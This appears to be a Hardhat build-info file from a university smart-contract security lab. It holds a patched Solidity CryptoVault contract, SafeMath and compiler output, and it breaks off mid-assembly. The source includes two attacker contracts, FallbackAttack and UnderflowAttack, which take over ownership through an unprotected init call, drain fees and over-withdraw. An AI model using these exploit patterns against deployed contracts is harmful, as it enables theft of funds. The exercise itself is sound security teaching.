{
	"id": "86c74037b94f380aafe6d01b06ff8e14",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.4",
	"solcLongVersion": "0.6.4+commit.1dca32f3",
	"input": {
		"language": "Solidity",
		"sources": {
			"PRACTICA 9/CryptoVault2.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.6.0; // Do not change the compiler version.\r\n\r\n/*\r\nRECUERDA: \r\nEn Solidity, una función fallback es una función especial que se ejecuta automáticamente cuando se realiza\r\n una llamada a un contrato que no coincide con ninguna de las funciones definidas en el contrato, o cuando \r\n se envían datos (calldata) que no se pueden asociar con una firma de función válida. Es una especie de \"comodín\"\r\n que que maneja llamadas no reconocidas.\r\n */\r\n\r\n/*AÑADIMOS LA LIBRERIA*/\r\n import \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\";\r\n\r\n/*\r\n * CryptoVault contract: A service for storing Ether.\r\n */\r\ncontract CryptoVault {\r\n    address public owner;      // Contract owner.\r\n\r\n    using SafeMath for uint256; //Habilito SafeMath para los uint 256.\r\n\r\n    uint public collectedFees; // Amount of the balance that\r\n                               // corresponds to fees.\r\n\r\n\r\n    /*Esto permite delegateCall a contrato externo potencialmente malicioso.*/\r\n    // address tLib;              // Library used for handling ownership. \r\n\r\n\r\n    uint8 prcFee;              // Percentage to be subtracted from\r\n                               // deposited amounts to charge fees. A\r\n                               // uint8 is used to represent\r\n                               // percentage with two decimal\r\n                               // digits. E.g, a value of 50 means a\r\n                               // percentage of 0.50%\r\n\r\n\r\n    mapping (address => uint256) public accounts;\r\n\r\n\r\n    // Constructor sets the owner of this contract using a VaultLib\r\n    // library contract, and an initial value for prcFee.\r\n    // NOTE: delegatecall invoke functions from tLib,\r\n    // but accessing to the storage contents of CryptoVault2.\r\n\r\n    /*Quitamos vaultLib*/\r\n    constructor(/*address _vaultLib*/ uint8 _prcFee) public {\r\n        // tLib = _vaultLib; No tenemos que hacer esto\r\n        prcFee = _prcFee;\r\n        //Llamada de delegatecall\r\n        /*EL DELEGATE CALL PERMITE LLAMAR A INIT SIN RESTRICCIONES*/\r\n        // (bool success,) = tLib.delegatecall(abi.encodeWithSignature(\"init(address)\",msg.sender));\r\n        VaultLib.init(owner, msg.sender);\r\n        // require(success,\"delegatecall failed\");\r\n    }\r\n\r\n\r\n    // deposit allows clients to deposit amounts of Ether. A percentage\r\n    // of the deposited amount is set aside as a fee for using this\r\n    // vault.\r\n    function deposit() public payable{\r\n        require (msg.value >= 100, \"Insufficient deposit\");\r\n        uint fee = msg.value * prcFee / 10000; // two decimal digits\r\n        accounts[msg.sender] += msg.value - fee; //Comisión que se resta de las cantidades depositadas.\r\n        collectedFees += fee;\r\n    }\r\n\r\n\r\n    // withdraw allows clients to recover part of the amounts deposited\r\n    // in this vault.\r\n    /*Utilizando SafeMath*/\r\n    function withdraw(uint _amount) public {\r\n        require (accounts[msg.sender].sub(_amount) >= 0, \"Insufficient funds\"); //He cambiado esta linea\r\n        accounts[msg.sender] = accounts[msg.sender].sub(_amount);\r\n        (bool sent, ) = msg.sender.call{value: _amount}(\"\");\r\n        require(sent, \"Failed to send funds\");\r\n    }\r\n\r\n\r\n    // withdrawAll is similar to withdraw, but withdrawing all Ether\r\n    // deposited by a client.\r\n    function withdrawAll() public {\r\n        uint amount = accounts[msg.sender];\r\n        require (amount > 0, \"Insufficient funds\");\r\n        accounts[msg.sender] = 0;\r\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\r\n        require(sent, \"Failed to send funds\");\r\n    }\r\n\r\n\r\n    // Any other function call is redirected to VaultLib library\r\n    // functions. NOTE: delegatecalls invoke functions from tLib,\r\n    // but accessing to the storage contents of CryptoVault2.\r\n\r\n    /*Los delegate calls sirven para hacer llamadas a funciones de una manera peligrosa.*/\r\n    // fallback () external payable {\r\n    //     //Llamadas de delegatecall\r\n    //     (bool success,) = tLib.delegatecall(msg.data);\r\n    //     require(success,\"delegatecall failed\");\r\n    // }\r\n    // receive () external payable {\r\n    //     // Llamadas de delegatecall\r\n    //     (bool success,) = tLib.delegatecall(msg.data);\r\n    //     require(success,\"delegatecall failed\");\r\n    // }\r\n\r\n    receive() external payable {deposit(); }\r\n\r\n\r\n\r\n}\r\n\r\n\r\n/*\r\n * VaultLib: Funciones que solo puede ejecutar el owner del contrato.\r\n */\r\nlibrary VaultLib { /*Cambiando contract por library eliminamos las variables de estado evitando que pueda cambiar el owner.*/\r\n    \r\n    //  ELIMINAMOS LAS VARIABLES PORQUE UN CONTRATO NO PUEDE TENER VARIABLES DE ESTADO\r\n    // address public owner;\r\n\r\n\r\n    // uint public collectedFees; // Amount of the balance that\r\n                               // corresponds to fees.\r\n\r\n\r\n    // address this_tLib;         // address of this library.\r\n\r\n    /*Cabiamos para que compruebe si es el owner que le pasamos por párametro.Añadimos por tanto el parametro */\r\n    modifier onlyOwner(address storageOwner) {\r\n        require(msg.sender == storageOwner,\"You are not the contract owner!\");\r\n        _;\r\n    }\r\n\r\n\r\n    // init is used to set the CryptoVault contract owner. It must be\r\n    // called using delegatecall.\r\n    /*Cambiamos para añadir como parámetro storageOwner. Actualizamos el owner en cryptovault.*/\r\n    function init(address storageOwner,address _owner) public {\r\n        require(storageOwner == address(0), \"El owner ya ha sido modificado y no puede cambiarse.\");/*Evitamos cambiar el owner despues de la inicialización*/\r\n        storageOwner = _owner;\r\n    }\r\n\r\n\r\n    // collectFees is used by the contract owner to transfer all fees\r\n    // collected from clients so far.\r\n    /*CAMBIAMOS VARIABLES DE ESTADO ANTERIORES DEL CONTRATO POR VARIABLES POR PARAMETRO DE LIBRERIA*/\r\n    function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r\n        require (storageFees > 0, \"No fees collected\");\r\n        uint fees = storageFees;\r\n        storageFees= 0;\r\n        (bool sent, ) = storageOwner.call{value: fees}(\"\");\r\n        require(sent, \"Failed to send fees\");\r\n    }\r\n\r\n\r\n    // Contract owner can update the library to be used.\r\n\r\n    /*Esto era vullnerable porque nos permite cambiar tLib por un contrato malicioso*/\r\n    // function setVaultLib(address _tLib) external onlyOwner {\r\n    //     this_tLib = _tLib;\r\n    // }\r\n\r\n    /*Ya no es necesario*/\r\n    // // Standard response for any non-standard call to CryptoVault.\r\n    // fallback () external payable {\r\n    //     revert(\"Calling a non-existent function!\");\r\n    // }\r\n\r\n    /*Tampoco es necesario*/\r\n    // // Standard response for plain transfers to CryptoVault.\r\n    // receive () external payable {\r\n    //     revert(\"This contract does not accept transfers with empty call data\");\r\n    // }\r\n}\r\n\r\n\r\n\r\n\r\ncontract FallbackAttack{\r\n\r\n\r\n    address attackedContract; //Contrato al que queremos atacar\r\n    // address _owner;\r\n\r\n\r\n    constructor(address at_contract) public {\r\n        attackedContract = at_contract;\r\n        // _owner = msg.sender;\r\n    }\r\n\r\n\r\n    function attack() external{\r\n        //Cambiar el address del contrato-> Le paso la dirección de este contrato atacante\r\n        attackedContract.call(abi.encodeWithSignature(\"init(address)\", address(this)));\r\n        // Recolectar las tarifas acumuladas\r\n        attackedContract.call(abi.encodeWithSignature(\"collectFees()\"));\r\n    }\r\n\r\n\r\n    // Retirar los fondos que he robado  attackedContract. Esos fondos los tiene este contrato atacante.\r\n    function withdrawFunds() external {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n \r\n    //Para poder recibir el Ether.\r\n    receive() external payable { }\r\n}\r\n\r\ncontract UnderflowAttack {\r\n\r\n    address attackedContract; //Contrato al que queremos atacar\r\n    // address _owner;\r\n\r\n\r\n    constructor(address at_contract) public {\r\n        attackedContract = at_contract;\r\n        // _owner = msg.sender;\r\n    }\r\n\r\n    function deposit() external payable {\r\n        require(msg.value >=100, \"Has depositado una cantidad demasiado pequeña\");\r\n\r\n        (bool success, )=attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\"));\r\n        require(success, \"No habido exito a la hora de depositar.\");\r\n    }\r\n\r\n    function attack(uint256 cantidad) external{\r\n        //Llamar a withdraw con una cantidad mayor al balance de mi contrato \r\n        (bool success,)= attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad));\r\n        require(success, \"Encima de ladrón soy tonto y no se atacar\");\r\n    } \r\n\r\n    function withdrawStolenEther() external{\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n\r\n    receive() external payable { }\r\n\r\n}\r\n"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.6.0 <0.8.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) return 0;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: division by zero\");\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"PRACTICA 9/CryptoVault2.sol": {
				"CryptoVault": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "_prcFee",
									"type": "uint8"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "accounts",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "collectedFees",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "deposit",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_amount",
									"type": "uint256"
								}
							],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawAll",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"PRACTICA 9/CryptoVault2.sol\":713:4403  contract CryptoVault {\r... */\n  mstore(0x40, 0x80)\n    /* \"PRACTICA 9/CryptoVault2.sol\":1873:2322  constructor(/*address _vaultLib*/ uint8 _prcFee) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"PRACTICA 9/CryptoVault2.sol\":1873:2322  constructor(/*address _vaultLib*/ uint8 _prcFee) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"PRACTICA 9/CryptoVault2.sol\":1873:2322  constructor(/*address _vaultLib*/ uint8 _prcFee) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":2005:2012  _prcFee */\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":1996:2002  prcFee */\n  0x02\n  0x00\n    /* \"PRACTICA 9/CryptoVault2.sol\":1996:2012  prcFee = _prcFee */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":2230:2238  VaultLib */\n  linkerSymbol(\"7c875b79f3c0fa0f993e0efba3531a04ff4f061d64a48e7ce8b064ceed9fd3c8\")\n    /* \"PRACTICA 9/CryptoVault2.sol\":2230:2243  VaultLib.init */\n  0xf09a4016\n    /* \"PRACTICA 9/CryptoVault2.sol\":2244:2249  owner */\n  0x00\n  dup1\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"PRACTICA 9/CryptoVault2.sol\":2251:2261  msg.sender */\n  caller\n    /* \"PRACTICA 9/CryptoVault2.sol\":2230:2262  VaultLib.init(owner, msg.sender) */\n  mload(0x40)\n  dup4\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  dup1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  dup3\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap3\n  pop\n  pop\n  pop\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  dup1\n  extcodesize\n  iszero\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_5:\n    /* \"PRACTICA 9/CryptoVault2.sol\":2230:2262  VaultLib.init(owner, msg.sender) */\n  pop\n  gas\n  delegatecall\n  iszero\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_7\n  jumpi\n    /* \"--CODEGEN--\":45:61   */\n  returndatasize\n    /* \"--CODEGEN--\":42:43   */\n  0x00\n    /* \"--CODEGEN--\":39:40   */\n  dup1\n    /* \"--CODEGEN--\":24:62   */\n  returndatacopy\n    /* \"--CODEGEN--\":77:93   */\n  returndatasize\n    /* \"--CODEGEN--\":74:75   */\n  0x00\n    /* \"--CODEGEN--\":67:94   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_7:\n    /* \"PRACTICA 9/CryptoVault2.sol\":2230:2262  VaultLib.init(owner, msg.sender) */\n  pop\n  pop\n  pop\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":1873:2322  constructor(/*address _vaultLib*/ uint8 _prcFee) public {\r... */\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":713:4403  contract CryptoVault {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"PRACTICA 9/CryptoVault2.sol\":713:4403  contract CryptoVault {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2e1a7d4d\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x5e5c06e2\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x853828b6\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x9003adfe\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"PRACTICA 9/CryptoVault2.sol\":4382:4391  deposit() */\n      tag_11\n        /* \"PRACTICA 9/CryptoVault2.sol\":4382:4389  deposit */\n      tag_12\n        /* \"PRACTICA 9/CryptoVault2.sol\":4382:4391  deposit() */\n      jump\t// in\n    tag_11:\n        /* \"PRACTICA 9/CryptoVault2.sol\":713:4403  contract CryptoVault {\r... */\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"PRACTICA 9/CryptoVault2.sol\":2933:3263  function withdraw(uint _amount) public {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_13:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2933:3263  function withdraw(uint _amount) public {\r... */\n      pop\n      tag_14\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_15:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2933:3263  function withdraw(uint _amount) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_16\n      jump\t// in\n    tag_14:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":1543:1587  mapping (address => uint256) public accounts */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_17:\n        /* \"PRACTICA 9/CryptoVault2.sol\":1543:1587  mapping (address => uint256) public accounts */\n      pop\n      tag_18\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_19:\n        /* \"PRACTICA 9/CryptoVault2.sol\":1543:1587  mapping (address => uint256) public accounts */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_20\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"PRACTICA 9/CryptoVault2.sol\":3374:3654  function withdrawAll() public {\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_21:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3374:3654  function withdrawAll() public {\r... */\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":741:761  address public owner */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_24:\n        /* \"PRACTICA 9/CryptoVault2.sol\":741:761  address public owner */\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"PRACTICA 9/CryptoVault2.sol\":868:893  uint public collectedFees */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n        /* \"PRACTICA 9/CryptoVault2.sol\":868:893  uint public collectedFees */\n      pop\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"PRACTICA 9/CryptoVault2.sol\":2489:2798  function deposit() public payable{\r... */\n    tag_8:\n      tag_30\n      tag_12\n      jump\t// in\n    tag_30:\n      stop\n    tag_12:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2555:2558  100 */\n      0x64\n        /* \"PRACTICA 9/CryptoVault2.sol\":2542:2551  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":2542:2558  msg.value >= 100 */\n      lt\n      iszero\n        /* \"PRACTICA 9/CryptoVault2.sol\":2533:2583  require (msg.value >= 100, \"Insufficient deposit\") */\n      tag_32\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x496e73756666696369656e74206465706f736974000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_32:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2594:2602  uint fee */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":2626:2631  10000 */\n      0x2710\n        /* \"PRACTICA 